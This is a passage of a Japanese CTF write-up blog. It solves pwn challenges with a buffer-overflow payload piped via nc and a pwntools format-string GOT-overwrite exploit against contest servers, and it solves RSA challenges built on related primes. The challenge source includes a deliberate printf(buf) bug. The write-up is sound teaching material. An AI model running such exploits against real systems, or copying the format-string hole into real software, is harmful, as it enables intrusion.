    style="padding-bottom: 17.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQY042MzQ6CMBCEy29BMSEYESgipdA2RC++/7uNS3uQxIMevszOzGaYfrW4rxeIscO4PHAnhnnFbdKY7JPUQGrKlKXO55sOSsNYAyE61HWN6lw5mJpmJBGHmXuYpYeSV6y2R3E8gKcJOE+9EnmeOc0oS13HEUYhGGMf5DS6ozkxCKIlmpwh3D/9IAh2vixLP0gjovDIzf8xFMfxV/YG45tcJmArBgwAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b130df030f34edc06c1cc1d707dfdd00/8ac56/image-20240616081623373.webp 240w,
/static/b130df030f34edc06c1cc1d707dfdd00/d3be9/image-20240616081623373.webp 480w,
/static/b130df030f34edc06c1cc1d707dfdd00/f23e7/image-20240616081623373.webp 814w"
              sizes="(max-width: 814px) 100vw, 814px"
              type="image/webp"
            />
          <source
            srcset="/static/b130df030f34edc06c1cc1d707dfdd00/8ff5a/image-20240616081623373.png 240w,
/static/b130df030f34edc06c1cc1d707dfdd00/e85cb/image-20240616081623373.png 480w,
/static/b130df030f34edc06c1cc1d707dfdd00/a4262/image-20240616081623373.png 814w"
            sizes="(max-width: 814px) 100vw, 814px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b130df030f34edc06c1cc1d707dfdd00/a4262/image-20240616081623373.png"
            alt="image-20240616081623373"
            title="image-20240616081623373"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>radare2 で win 関数のアドレスと main 関数のバッファのオフセットだけ確認します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 522px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/27cc26307230cc36e8e740399e268f80/29492/image-20240616082009105.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACBklEQVQ4y4WT13KCYBSEbeAoFkTsBRXBXqNg3v/BNmcPERMTk4t/EGU+tplZ+yZOaxMr30DgZeA2DPT6AxQKeWQyGeTzeflcQC6XSw+//3qy2ezjPo7PuL1fEEUnuG4DpmmgVqvpj9VqBfO5D88bY7lawPdnWCwX8n31BzQ91+iKKI7Aq+M4oqgAy7JS4FIA09kUm+1a4fv9DsPh4DXwcn0T2AW8Ok1HLVpWOQWGYYDJxBOFS1W63qxQKpVeA6P4ivgWKdRxGjCMAioCSoBVsRhi5lPhRpROcDwd0Gq3/laoJ3ooLJcThVbFUuDYG2mGavmwQyCqWdTvGT4p5IOVSpJhp9OBL5DVeqlAWnVbrrr4UyFtH457NBq2tGxKy0mLDJ/5BeFcs6P10XiEwaCPbreDvlyZK4V8afmi6nb7rQBlNkUznc0dNhbIPEjsUikPQafzUSOxbfuxxTuQCpkhLd9nwxeEi0AyHOshaLvbKKgtxfR6Xdjiip+Z/bdSqDDZoZTyOZuW5MUChqMhptOJbpEvazabv/5jvs2Gb2V2hmFou/zRE8tslsMOF6GCXpbxPBvu63k29XpdsptrXgQzKxbH57hR2uUz3G29XnsovL3HGjjLoEICaYlWGTptc0r2J4xREO66Tb3nlNKm3y5n8NAy31YsFlG9z0aA3CELaXfaOpP/LH8Aaw1zMmcFbIIAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/27cc26307230cc36e8e740399e268f80/8ac56/image-20240616082009105.webp 240w,
/static/27cc26307230cc36e8e740399e268f80/d3be9/image-20240616082009105.webp 480w,
/static/27cc26307230cc36e8e740399e268f80/25feb/image-20240616082009105.webp 522w"
              sizes="(max-width: 522px) 100vw, 522px"
              type="image/webp"
            />
          <source
            srcset="/static/27cc26307230cc36e8e740399e268f80/8ff5a/image-20240616082009105.png 240w,
/static/27cc26307230cc36e8e740399e268f80/e85cb/image-20240616082009105.png 480w,
/static/27cc26307230cc36e8e740399e268f80/29492/image-20240616082009105.png 522w"
            sizes="(max-width: 522px) 100vw, 522px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/27cc26307230cc36e8e740399e268f80/29492/image-20240616082009105.png"
            alt="image-20240616082009105"
            title="image-20240616082009105"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9278bf02aa97f8a5d0fcf72b29200404/9239a/image-20240616082132183.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABqElEQVQoz5WT6XKbQBCE9wYWFlhuhIwsxVblev/X67QFrrISJRX/6JqFYj6mZ2bF2KeYW4NTGXCZDmizFF1O+RQ9z85aCCH+X8r626GcClTLgrF38KOBzRTKpIRxyeeA2u4JPyREL9BUDt35BGEV4nRBezwjL7LPANPt8I3qBGKd4/B1hQ4WYX5BvbyiHI5QSsBKjSbJWXmO4DIo5qm/Ar9vwDLW6F9aKC3h5xPi/IQ01LdvjJQIdFQyxxuHjO+SfwIHgVCXqK8lRMLkwyvaaYRLtsFYY1F1K3w1wGpzq07vMnu8B7KHsSkwP59p0SCfVlSHK7Kqh2B1VrKv2qJUGoHPnnluV7rH+x4SGGi5+fIE5TSK+YLQH5EUDSQtWv6kTXPElBuReOR7ZY8t/9wsxzZwyhyCFKxuQXd8Rmi62zdqB7xF+cHuY+BK1YQEx53k2miHopnh48ihNDCsKuF0W1qO7F+k7erd5kPglWoFfN2gugxQViCbV1pe4IrIG6A5FO4owQMVafkN6P+4KeZ9sTfLNo9QrYXWXHLf86Y4SKXukuSHKH8D/gIlyAPsvajSegAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9278bf02aa97f8a5d0fcf72b29200404/8ac56/image-20240616082132183.webp 240w,
/static/9278bf02aa97f8a5d0fcf72b29200404/d3be9/image-20240616082132183.webp 480w,
/static/9278bf02aa97f8a5d0fcf72b29200404/e46b2/image-20240616082132183.webp 960w,
/static/9278bf02aa97f8a5d0fcf72b29200404/0d9bd/image-20240616082132183.webp 1246w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/9278bf02aa97f8a5d0fcf72b29200404/8ff5a/image-20240616082132183.png 240w,
/static/9278bf02aa97f8a5d0fcf72b29200404/e85cb/image-20240616082132183.png 480w,
/static/9278bf02aa97f8a5d0fcf72b29200404/d9199/image-20240616082132183.png 960w,
/static/9278bf02aa97f8a5d0fcf72b29200404/9239a/image-20240616082132183.png 1246w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9278bf02aa97f8a5d0fcf72b29200404/d9199/image-20240616082132183.png"
            alt="image-20240616082132183"
            title="image-20240616082132183"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>あとは上記の確認結果を元に以下のコマンドで作成したペイロードを送ることで Flag を取得できました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python3 -c <span class="token string">'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*0x12 + p64(0x401186))'</span>  <span class="token operator">|</span> <span class="token function">nc</span> simpleoverwrite.beginners.seccon.games <span class="token number">9001</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 862px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b05f84c3f85a2c89264bf10ca19f2614/f0551/image-20240616082443122.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 12.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAmUlEQVQI15WKSQ6CMABFy2ApujEkipW2SGVQohDk/md7NngCFz/vT6JfNd2isf6Gf8ycjKcMct0Y8oRrR5pA44eNrn1ybQb8MNL3He/phXWWy6XEWIOotMHZmnmewuGO1iXWVnhfUxRH5C4lVxmZ3HHY56hMBp8iQ85zFShRSpEkCUIIhL839EPHZ104nc9bGcfxb/xTURTxBQfeSWPxgHj7AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b05f84c3f85a2c89264bf10ca19f2614/8ac56/image-20240616082443122.webp 240w,
/static/b05f84c3f85a2c89264bf10ca19f2614/d3be9/image-20240616082443122.webp 480w,
/static/b05f84c3f85a2c89264bf10ca19f2614/e32b8/image-20240616082443122.webp 862w"
              sizes="(max-width: 862px) 100vw, 862px"
              type="image/webp"
            />
          <source
            srcset="/static/b05f84c3f85a2c89264bf10ca19f2614/8ff5a/image-20240616082443122.png 240w,
/static/b05f84c3f85a2c89264bf10ca19f2614/e85cb/image-20240616082443122.png 480w,
/static/b05f84c3f85a2c89264bf10ca19f2614/f0551/image-20240616082443122.png 862w"
            sizes="(max-width: 862px) 100vw, 862px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b05f84c3f85a2c89264bf10ca19f2614/f0551/image-20240616082443122.png"
            alt="image-20240616082443122"
            title="image-20240616082443122"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="pure-and-easypwn" style="position:relative;"><a href="#pure-and-easypwn" aria-label="pure and easypwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>pure-and-easy(Pwn)</h2>
<p>スーパイージー問題 3 でした。</p>
<p>問題バイナリについて以下のソースコードが与えられます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>見た感じで FSB の脆弱性があることがわかります。</p>
<p>また、PIE 無効 &#x26; Partial RELRO なので手軽に GOT オーバーライドをできそうです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 796px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b1e8858808b04e5dd866e7284f6d16c2/d48f1/image-20240616082659690.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 17.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAsElEQVQY052M2W7CMBREb4Aqi50oLHFEdtsoCQHE/3/dqdUX1LeqD0czmhmN9I8S967o1xOm62jdRuPutHZhml/0t43O35mW4P3GdbgFfMhW5nVhHAeatsEYQ13XiLOOqjKcyiPb4pn9GHTETS1aK7TKflSplKLIybKUNE3Icx0yRZzEiMiH1/vJ+Xxh9yUM655q2HG1Qqyj38O/Yu2ERBHJQTBaqEuhycJ5KIt/HH4DtCpdjOcrltwAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b1e8858808b04e5dd866e7284f6d16c2/8ac56/image-20240616082659690.webp 240w,
/static/b1e8858808b04e5dd866e7284f6d16c2/d3be9/image-20240616082659690.webp 480w,
/static/b1e8858808b04e5dd866e7284f6d16c2/7fcbc/image-20240616082659690.webp 796w"
              sizes="(max-width: 796px) 100vw, 796px"
              type="image/webp"
            />
          <source
            srcset="/static/b1e8858808b04e5dd866e7284f6d16c2/8ff5a/image-20240616082659690.png 240w,
/static/b1e8858808b04e5dd866e7284f6d16c2/e85cb/image-20240616082659690.png 480w,
/static/b1e8858808b04e5dd866e7284f6d16c2/d48f1/image-20240616082659690.png 796w"
            sizes="(max-width: 796px) 100vw, 796px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b1e8858808b04e5dd866e7284f6d16c2/d48f1/image-20240616082659690.png"
            alt="image-20240616082659690"
            title="image-20240616082659690"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>そのため、これ見よがしに設置されている exit 関数の GOT オーバーライドで win 関数を実行するよう、以下の Solver を作成しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># Set context</span>
<span class="token comment"># context.log_level = "debug"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>word_size <span class="token operator">=</span> <span class="token number">64</span>

<span class="token comment"># Set target</span>
target <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pure-and-easy.beginners.seccon.games"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>
TARGET_PATH <span class="token operator">=</span> <span class="token string">"./chall"</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>TARGET_PATH<span class="token punctuation">)</span>
got_exit <span class="token operator">=</span> <span class="token number">0x404040</span>
win <span class="token operator">=</span> <span class="token number">0x401341</span>

<span class="token comment"># Exploit</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"> "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>got_exit<span class="token punctuation">:</span>win<span class="token punctuation">}</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># Finish exploit</span>
target<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/c9a2892b59799b6ec11b17b927dab9f0/712f7/image-20240616091036238.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 12.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAVUlEQVQI132MOw7AIAzFAhSIIIUqCPq5/z1fK5ZuDJYnm/ZSICIIIYCZETnCew8iWpJSQj0qsuSvz/Mxu+e+MM6B1hR99GlVncFqaK2F2xyc+zHG4AV0rSr5mV66VgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/c9a2892b59799b6ec11b17b927dab9f0/8ac56/image-20240616091036238.webp 240w,
/static/c9a2892b59799b6ec11b17b927dab9f0/d3be9/image-20240616091036238.webp 480w,
/static/c9a2892b59799b6ec11b17b927dab9f0/e46b2/image-20240616091036238.webp 960w,
/static/c9a2892b59799b6ec11b17b927dab9f0/a110d/image-20240616091036238.webp 1181w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/c9a2892b59799b6ec11b17b927dab9f0/8ff5a/image-20240616091036238.png 240w,
/static/c9a2892b59799b6ec11b17b927dab9f0/e85cb/image-20240616091036238.png 480w,
/static/c9a2892b59799b6ec11b17b927dab9f0/d9199/image-20240616091036238.png 960w,
/static/c9a2892b59799b6ec11b17b927dab9f0/712f7/image-20240616091036238.png 1181w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/c9a2892b59799b6ec11b17b927dab9f0/d9199/image-20240616091036238.png"
            alt="image-20240616091036238"
            title="image-20240616091036238"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ちなみに、今回は雑に fmtstr_payload を使用していますが、FSA の詳細やペイロードをハンドメイドする手法については以下の記事でまとめています。</p>
<p>参考：<a href="/ctf-pwn-og">よちよち CTFer の Pwn 超入門 - FSB の基礎と ROP のテクニック 編- - かえるのひみつきち</a></p>
<h2 id="safe-primecrypto" style="position:relative;"><a href="#safe-primecrypto" aria-label="safe primecrypto permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Safe Prime(Crypto)</h2>
<blockquote>
<p>Using a safe prime makes RSA secure, doesn’t it?</p>
</blockquote>
<p>久々に Crypto 解きました。</p>
<p>問題バイナリとして以下のスクリプトと n,e,c が与えられます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime

FLAG <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"ctf4b{*** REDACTED ***}"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>FLAG<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>n <span class="token operator">=</span> <span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>c <span class="token operator">=</span> <span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre></div>
<p>p を利用して q を生成しているため、n を p の 1 変数を使用する 2 次方程式で表現できます。</p>
<p>そのため、以下の Solver を使用して方程式を解いて p,q を求めることで暗号文を復号して Flag を取得できました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> Eq<span class="token punctuation">,</span> solve<span class="token punctuation">,</span> mod_inverse
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token number">40791470236110804733312817275921324892019927976655404478966109115157033048751614414177683787333122984170869148886461684367352872341935843163852393126653174874958667177632653833127408726094823976937236033974500273341920433616691535827765625224845089258529412235827313525710616060854484132337663369013424587861</span>
n <span class="token operator">=</span> <span class="token number">292927367433510948901751902057717800692038691293351366163009654796102787183601223853665784238601655926920628800436003079044921928983307813012149143680956641439800408783429996002829316421340550469318295239640149707659994033143360850517185860496309968947622345912323183329662031340775767654881876683235701491291</span>
equation <span class="token operator">=</span> Eq<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> p<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
solutions <span class="token operator">=</span> solve<span class="token punctuation">(</span>equation<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
p <span class="token operator">=</span> solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
q <span class="token operator">=</span> q <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> q<span class="token punctuation">)</span> <span class="token operator">==</span> n

phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> mod_inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># ctf4b{R3l4ted_pr1m3s_4re_vuLner4ble_n0_maTt3r_h0W_l4rGe_p_1s}</span></code></pre></div>
<h2 id="mathcrypto" style="position:relative;"><a href="#mathcrypto" aria-label="mathcrypto permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>math(Crypto)</h2>
<blockquote>
<p>RSA暗号に用いられる変数に特徴的な条件があるようですね…?</p>
</blockquote>
<p>問題バイナリとして以下のコードと、n,e,c,ab が与えられます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> isPrime
<span class="token keyword">from</span> secret <span class="token keyword">import</span> <span class="token punctuation">(</span>
    x<span class="token punctuation">,</span>
    p<span class="token punctuation">,</span>
    q<span class="token punctuation">,</span>
<span class="token punctuation">)</span>  <span class="token comment"># x, p, q are secret values, please derive them from the provided other values.</span>
<span class="token keyword">import</span> gmpy2


<span class="token keyword">def</span> <span class="token function">is_square</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">==</span> n


<span class="token keyword">assert</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">assert</span> isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
